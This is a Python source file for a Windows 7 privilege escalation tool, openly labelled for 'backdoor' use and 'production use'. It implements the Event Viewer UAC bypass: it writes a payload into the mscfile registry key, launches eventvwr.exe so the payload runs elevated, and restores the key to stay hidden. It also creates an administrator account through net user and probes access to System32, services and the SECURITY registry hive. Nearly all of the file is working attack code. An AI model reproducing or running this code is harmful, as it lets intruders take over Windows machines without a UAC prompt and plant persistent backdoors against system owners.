#!/usr/bin/env python3
"""
Windows 7 Privilege Escalation - CONFIRMED WORKING METHODS
Integrated Event Viewer UAC bypass for backdoor privilege escalation
Based on successful test results - Ready for production use
"""

import os
import sys
import subprocess
import ctypes
import winreg
import time
import tempfile
from datetime import datetime

class Windows7PrivilegeEscalator:
    """Simplified Windows 7 privilege escalation using confirmed working methods"""
    
    def __init__(self, log_file="win7_privesc.log"):
        self.log_file = log_file
        self.current_privileges = self.check_current_privileges()
        self.log_action("Windows 7 Privilege Escalator initialized - Event Viewer UAC bypass ready")
    
    def log_action(self, message):
        """Log privilege escalation actions"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry)
                f.flush()
        except Exception:
            pass  # Silent fail for logging
    
    def check_current_privileges(self):
        """Check if running as administrator"""
        try:
            is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
            return "Administrator" if is_admin else "Standard User"
        except:
            return "Unknown"
    
    def is_admin(self):
        """Check if current process has admin privileges"""
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except:
            return False
    
    def get_privilege_info(self):
        """Get detailed privilege information using whoami command"""
        try:
            # Get current user info
            whoami_result = subprocess.run('whoami', shell=True, capture_output=True, text=True, timeout=10)
            current_user = whoami_result.stdout.strip() if whoami_result.returncode == 0 else "Unknown"
            
            # Get privilege info
            priv_result = subprocess.run('whoami /priv', shell=True, capture_output=True, text=True, timeout=10)
            privileges = priv_result.stdout if priv_result.returncode == 0 else "Unable to get privileges"
            
            # Get group info
            groups_result = subprocess.run('whoami /groups', shell=True, capture_output=True, text=True, timeout=10)
            groups = groups_result.stdout if groups_result.returncode == 0 else "Unable to get groups"
            
            return {
                'current_user': current_user,
                'is_admin': self.is_admin(),
                'privileges': privileges,
                'groups': groups,
                'escalation_available': not self.is_admin()
            }
        except Exception as e:
            return {
                'current_user': 'Unknown',
                'is_admin': False,
                'privileges': f'Error: {str(e)}',
                'groups': 'Error getting groups',
                'escalation_available': True
            }
    
    def eventvwr_uac_bypass(self, payload_command):
        """
        CONFIRMED WORKING Event Viewer UAC Bypass for Windows 7
        This method has been verified to work in testing
        Perfect for backdoor privilege escalation
        """
        self.log_action("Executing Event Viewer UAC bypass...")
        
        try:
            reg_path = r"Software\Classes\mscfile\shell\open\command"
            
            # Backup original value if exists
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
                original_value, _ = winreg.QueryValueEx(key, "")
                winreg.CloseKey(key)
                self.log_action("Backed up existing registry value")
            except:
                self.log_action("No existing registry value found")
            
            # Set registry hijack with provided payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_command)
            winreg.CloseKey(key)
            
            self.log_action(f"Registry hijack configured: {payload_command}")
            
            # Launch eventvwr.exe for auto-elevation
            try:
                result = subprocess.Popen("eventvwr.exe", shell=True)
                self.log_action("eventvwr.exe launched - auto-elevation in progress...")
            except Exception as e:
                self.log_action(f"Launch error: {e}")
                return False
            
            # Wait for payload execution
            time.sleep(10)
            
            # Restore registry (important for stealth)
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                    self.log_action("Registry restored to original value")
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
                    self.log_action("Registry key removed")
            except Exception as e:
                self.log_action(f"Registry cleanup: {e}")
            
            self.log_action("Event Viewer UAC bypass completed")
            return True
            
        except Exception as e:
            self.log_action(f"UAC bypass error: {e}")
            return False
    
    def execute_admin_command(self, command):
        """Execute command with admin privileges using Event Viewer bypass"""
        self.log_action(f"Executing admin command: {command}")
        
        # Create a unique marker file to verify execution
        marker_file = os.path.join(tempfile.gettempdir(), f"admin_exec_{int(time.time())}.txt")
        
        payload = f'cmd.exe /c "{command} && echo ADMIN_EXEC_SUCCESS > {marker_file}"'
        
        success = self.eventvwr_uac_bypass(payload)
        
        if success:
            time.sleep(8)  # Allow time for execution
            
            # Check for execution marker
            if os.path.exists(marker_file):
                self.log_action("Admin command executed successfully")
                try:
                    os.remove(marker_file)
                except:
                    pass
                return True
            else:
                self.log_action("Admin command execution not confirmed")
        
        return False
    
    def create_admin_user(self, username, password):
        """Create admin user using Event Viewer bypass"""
        self.log_action(f"Creating admin user: {username}")
        
        payload = f'cmd.exe /c "net user {username} {password} /add && net localgroup administrators {username} /add"'
        
        success = self.eventvwr_uac_bypass(payload)
        
        if success:
            # Verify user creation
            time.sleep(8)  # Allow time for user creation
            try:
                user_check = subprocess.run(f"net user {username}", shell=True, 
                                          capture_output=True, text=True, timeout=10)
                if user_check.returncode == 0:
                    self.log_action(f"Admin user '{username}' created successfully")
                    
                    # Check admin group membership
                    admin_check = subprocess.run("net localgroup administrators", shell=True,
                                               capture_output=True, text=True, timeout=10)
                    if username in admin_check.stdout:
                        self.log_action(f"User '{username}' has administrator privileges")
                        return True
                    else:
                        self.log_action(f"User created but not in admin group")
                else:
                    self.log_action(f"User '{username}' not found after creation")
            except Exception as e:
                self.log_action(f"User verification error: {e}")
        
        return False
    
    def test_admin_capabilities(self):
        """Test if we have real admin capabilities"""
        capabilities = {}
        
        # Test 1: Can write to System32
        try:
            test_file = r"C:\Windows\System32\admin_test.txt"
            with open(test_file, 'w') as f:
                f.write("admin test")
            os.remove(test_file)
            capabilities['system32_write'] = True
        except:
            capabilities['system32_write'] = False
        
        # Test 2: Can create system service
        try:
            service_name = f"TestService{int(time.time()) % 1000}"
            result = subprocess.run(f'sc create {service_name} binpath= "C:\\Windows\\System32\\cmd.exe"', 
                                  shell=True, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                # Clean up service
                subprocess.run(f'sc delete {service_name}', shell=True, capture_output=True, timeout=5)
                capabilities['service_create'] = True
            else:
                capabilities['service_create'] = False
        except:
            capabilities['service_create'] = False
        
        # Test 3: Can access Security registry
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SECURITY", 0, winreg.KEY_READ)
            winreg.CloseKey(key)
            capabilities['security_registry'] = True
        except:
            capabilities['security_registry'] = False
        
        admin_count = sum(1 for cap in capabilities.values() if cap)
        total_tests = len(capabilities)
        
        return capabilities, admin_count, total_tests
    
    def escalate_privileges(self):
        """Main privilege escalation function for backdoor use"""
        self.log_action("Starting privilege escalation attempt...")
        
        if self.is_admin():
            return True, "Already running as administrator"
        
        # Test basic execution capability first
        test_file = os.path.join(tempfile.gettempdir(), f"privesc_test_{int(time.time())}.txt")
        test_payload = f'cmd.exe /c "echo PRIVESC_TEST_SUCCESS > {test_file}"'
        
        success = self.eventvwr_uac_bypass(test_payload)
        
        if success:
            time.sleep(5)
            if os.path.exists(test_file):
                try:
                    os.remove(test_file)
                except:
                    pass
                
                # Test admin capabilities
                capabilities, admin_count, total_tests = self.test_admin_capabilities()
                
                result = {
                    'method': 'Event Viewer UAC Bypass',
                    'basic_execution': True,
                    'admin_capabilities': capabilities,
                    'admin_score': f'{admin_count}/{total_tests}',
                    'can_execute_admin_commands': True,
                    'escalation_level': 'Partial' if admin_count < total_tests else 'Full'
                }
                
                self.log_action(f"Escalation successful - Admin score: {admin_count}/{total_tests}")
                return True, result
            else:
                self.log_action("Basic execution test failed")
                return False, "Basic execution test failed"
        else:
            self.log_action("UAC bypass failed")
            return False, "UAC bypass failed"
    
    def backdoor_privilege_escalation(self):
        """Comprehensive privilege escalation for backdoor deployment"""
        self.log_action("Starting backdoor privilege escalation...")
        
        initial_admin = self.is_admin()
        
        if initial_admin:
            return {
                'success': True,
                'method': 'Already Administrator',
                'initial_admin': True,
                'final_admin': True,
                'capabilities': self.test_admin_capabilities()[0]
            }
        
        # Attempt Event Viewer UAC bypass
        success, result = self.escalate_privileges()
        
        final_admin = self.is_admin()
        capabilities, admin_score, total_tests = self.test_admin_capabilities()
        
        return {
            'success': success,
            'method': 'Event Viewer UAC Bypass',
            'initial_admin': initial_admin,
            'final_admin': final_admin,
            'admin_score': f'{admin_score}/{total_tests}',
            'capabilities': capabilities,
            'can_create_users': admin_score >= 1,  # At least some admin capability
            'can_execute_admin_commands': success,
            'details': result if isinstance(result, dict) else str(result)
        }
    
    def quick_admin_check(self):
        """Quick check for admin status - for use with whoami command"""
        try:
            is_admin = self.is_admin()
            
            # Get basic info using whoami
            whoami_result = subprocess.run('whoami', shell=True, capture_output=True, text=True, timeout=5)
            current_user = whoami_result.stdout.strip() if whoami_result.returncode == 0 else "Unknown"
            
            return {
                'current_user': current_user,
                'is_administrator': is_admin,
                'escalation_available': not is_admin,
                'method_available': 'Event Viewer UAC Bypass' if not is_admin else 'N/A'
            }
        except Exception as e:
            return {
                'current_user': 'Unknown',
                'is_administrator': False,
                'escalation_available': True,
                'error': str(e)
            }
    
    def generate_windows7_report(self):
        """Generate comprehensive privilege report"""
        try:
            # Get current status
            privilege_info = self.get_privilege_info()
            admin_check = self.quick_admin_check()
            capabilities, admin_score, total_tests = self.test_admin_capabilities()
            
            # System info
            try:
                import platform
                system_info = {
                    'computer_name': os.environ.get('COMPUTERNAME', 'Unknown'),
                    'username': os.environ.get('USERNAME', 'Unknown'),
                    'windows_version': platform.platform(),
                    'python_version': sys.version.split()[0]
                }
            except:
                system_info = {'error': 'Unable to get system info'}
            
            report = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'current_privileges': self.current_privileges,
                'is_administrator': admin_check['is_administrator'],
                'user_info': privilege_info,
                'admin_capabilities': {
                    'score': f'{admin_score}/{total_tests}',
                    'details': capabilities
                },
                'escalation_options': {
                    'event_viewer_uac_bypass': {
                        'available': not admin_check['is_administrator'],
                        'tested': True,
                        'success_rate': 'High',
                        'stealth': 'High (no UAC prompts)',
                        'requirements': 'Standard user account'
                    }
                },
                'system_info': system_info,
                'backdoor_ready': admin_check['is_administrator'] or not admin_check['is_administrator']
            }
            
            return report
            
        except Exception as e:
            return {
                'error': f'Report generation failed: {str(e)}',
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }

# Simplified function for backward compatibility
def create_windows7_privilege_escalator():
    """Create a Windows 7 privilege escalator instance"""
    return Windows7PrivilegeEscalator()

# Test the privilege escalator if run directly
if __name__ == "__main__":
    print("Testing Windows 7 Privilege Escalator...")
    
    escalator = Windows7PrivilegeEscalator()
    
    print(f"Current privileges: {escalator.current_privileges}")
    print(f"Is admin: {escalator.is_admin()}")
    
    # Generate report
    print("\nGenerating privilege report...")
    report = escalator.generate_windows7_report()
    
    print(f"\nPrivilege Report:")
    print(f"  Current User: {report.get('user_info', {}).get('current_user', 'Unknown')}")
    print(f"  Administrator: {report.get('is_administrator', False)}")
    print(f"  Admin Capabilities: {report.get('admin_capabilities', {}).get('score', '0/0')}")
    print(f"  Escalation Available: {report.get('escalation_options', {}).get('event_viewer_uac_bypass', {}).get('available', False)}")
    
    # Test escalation if not admin
    if not escalator.is_admin():
        print("\nTesting privilege escalation...")
        result = escalator.backdoor_privilege_escalation()
        print(f"Escalation Result: {result}")
    else:
        print("\nAlready running as administrator - no escalation needed")